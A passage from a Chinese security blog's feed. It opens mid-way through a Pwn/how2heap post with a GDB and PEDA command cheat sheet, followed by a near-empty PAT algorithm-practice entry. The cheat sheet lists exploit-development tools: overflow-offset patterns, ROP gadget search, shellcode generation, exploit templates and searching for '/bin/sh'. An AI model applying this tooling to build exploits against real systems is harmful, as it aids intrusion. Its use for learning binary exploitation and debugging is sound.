按二进制格式显示变量。<br>a 按十六进制格式显示变量。<br>c 按字符格式显示变量。<br>f 按浮点数格式显示变量。<br>i：反汇编<br><br>但是实际的组合就那么几种：<br>x/s 地址　　查看字符串<br>x/wx 地址　　查看DWORD<br>x/c 地址　　单字节查看<br>x/<span class="hljs-number">16</span>x $esp+<span class="hljs-number">12</span> 查看寄存器偏移<br><br><span class="hljs-built_in">set</span> args  - 可指定运行时参数。（如：<span class="hljs-built_in">set</span> args <span class="hljs-number">10</span> <span class="hljs-number">20</span> <span class="hljs-number">30</span> <span class="hljs-number">40</span> <span class="hljs-number">50</span>）<br>show args  - 命令可以查看设置好的运行参数。<br></code></pre></td></tr></table></figure><h2 id="peda-插件命令"><a href="#peda-插件命令" class="headerlink" title="peda 插件命令"></a>peda 插件命令</h2><ul><li>aslr - 显示/设定 GDB 的 ASLR(地址空间配置随机加载)设置</li></ul><p>gdb-peda$ aslr ASLR is OFF</p><ul><li>checksec - 检查二进制文件的各种安全选项</li></ul><p>gdb-peda$ checksec CANARY : disabled FORTIFY : disabled NX : ENABLED PIE : disabled RELRO : Partial</p><ul><li>dumpargs - 函数将要被调用时，显示将要被传入函数的所有参数(默认会在反汇编代码下方自动显示)</li><li>dumprop - 在给定内存范围中 Dump 出所有 ROP gadgets</li><li>elfheader - 从被调试的 ELF 文件中获取标题信息</li><li>elfsymbol - 从 ELF 文件获取非调试符号信息（plt 表）</li><li>lookup - 搜索所有地址/参考地址属于一个内存范围</li><li>patch - 修补程序内存以 string / hexstring / int 的地址开始</li><li>procinfo - 显示/ proc / pid /</li><li>pshow - 显示各种 PEDA 选项和其他设置</li><li>pset - 设置各种 PEDA 选项和其他设置</li><li>pattern - 生成字符串模板 写入内存 用于定位溢出点<ul><li>pattern create size 生成特定长度字符串</li><li>pattern offset value 定位字符串</li></ul></li><li>procinfo – Display various info from /proc/pid/</li><li>pshow – Show various PEDA options and other settings</li><li>pset– Set various PEDA options and other settings</li><li>readelf - 从 ELF 文件获取标题信息</li><li>ropgadget - 获取二进制或库的通用 ROP 小工具</li><li>ropsearch - 在内存中搜索 ROP 小工具</li><li>searchmem - 用搜索内存<ul><li>searchmem|find - 在内存中查找字符串，支持正则表达式，例如 searchmem “/bin/sh” libc</li></ul></li><li>shellcode - 生成或下载常用的 shellcode。</li><li>skeleton - 生成 python 漏洞利用代码模板</li><li>vmmap - 可以用来查看栈、bss 段是否可以执行</li><li>xormem - 用一个键异或存储区域</li><li>ptype struct link_map - 查看 link_map 定义</li><li>p &amp;((struct link_map*)0)-&gt;l_info - 查看 l_info 成员偏移</li></ul><h1 id="主要参考"><a href="#主要参考" class="headerlink" title="主要参考"></a>主要参考</h1><p>【1】<a href="https://blog.csdn.net/kelxLZ/article/details/112972504">https://blog.csdn.net/kelxLZ/article/details/112972504</a><br>​</p><p>​</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>因为之前把 wsl2 搞崩了，为了这个实验，又又又重装了一次<br>卸载过程参考：<br><a href="https://blog.csdn.net/qq_39522282/article/details/86168907">https://blog.csdn.net/qq_39522282/article/details/86168907</a><br><a href="https://blog.csdn.net/gzroy/article/details/104069536">https://blog.csdn.net/gzroy/article/details/104069536</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;实验使用 wsl 进行，具体的 glibc 版本为 2.28，运行&lt;code&gt;/lib/x86_64-linux-gnu/libc.so.6&lt;/code&gt;即可看到版本&lt;br&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2021/png/1629942/1622445587922-c664f9cc-f070-4d9c-a8fe-be7c909b0a53.png#clientId=u347f053a-7aac-4&amp;from=paste&amp;height=121&amp;id=ubcbe185e&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=241&amp;originWidth=756&amp;originalType=binary%E2%88%B6=1&amp;size=264115&amp;status=done&amp;style=none&amp;taskId=u396bde25-eab2-4a06-bb3b-c2811987e8d&amp;width=378&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Pwn" scheme="https://www.blog.hackerjerry.top/categories/Pwn/"/>
    
    
    <category term="how2heap" scheme="https://www.blog.hackerjerry.top/tags/how2heap/"/>
    
  </entry>
  
  <entry>
    <title>PAT算法刷题(2)</title>
    <link href="https://www.blog.hackerjerry.top/2021/PAT%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98(2)/"/>
    <id>https://www.blog.hackerjerry.top/2021/PAT%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98(2)/</id>
    <published>2021-05-26T12:29:57.000Z</published>
    <updated>2022-02-07T10:05:54.188Z</updated>
    
    <content type="html"><![CDATA[<p>​</p><a id="more"></a><h1 id="指针变量"><a href="#指针变量" class="headerlink" title="指针变量"></a>指针变量</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622043047928-fdfd5cca-83fe-415e-8130-2473806b67be.png#clientId=u4e2ecc72-0b61-4&from=paste&height=80&id=u74d31445&margin=%5Bobject%20Object%5D&name=image.png&originHeight=160&originWidth=1066&originalType=binary%E2%88%B6=1&size=160064&status=done&style=none&taskId=ube714c6b-8abc-4802-833e-8c45fb5800e&width=533" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622043066255-5db7ee69-6ca8-43cd-a52d-abd13ebb6abb.png#clientId=u4e2ecc72-0b61-4&from=paste&height=61&id=u5201477b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=122&originWidth=1067&originalType=binary%E2%88%B6=1&size=134720&status=done&style=none&taskId=u0092dfb5-b66b-4a05-aeb6-8f6dcb75222&width=533.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622044106942-f18df800-b653-48d6-b08b-c7c1190c1651.png#clientId=u4e2ecc72-0b61-4&from=paste&height=295&id=ucedf3117&margin=%5Bobject%20Object%5D&name=image.png&originHeight=590&originWidth=736&originalType=binary%E2%88%B6=1&size=388439&status=done&style=none&taskId=u418c5398-37ca-45e4-890a-f7389a9b005&width=368" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622044120723-af185276-2399-465f-82e5-445177ea700b.png#clientId=u4e2ecc72-0b61-4&from=paste&height=174&id=u5ad65c12&margin=%5Bobject%20Object%5D&name=image.png&originHeight=348&originWidth=1082&originalType=binary%E2%88%B6=1&size=336793&status=done&style=none&taskId=ubbb32c63-b028-443d-b148-9eac916a2f7&width=541" alt="image.png"></p><h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1>]]></content>
    
    
    <summary type="html">&lt;p&gt;​&lt;/p&gt;</summary>
    
    
    
    <category term="PAT" scheme="https://www.blog.hackerjerry.top/categories/PAT/"/>
    
    
  </entry>
  
</feed>
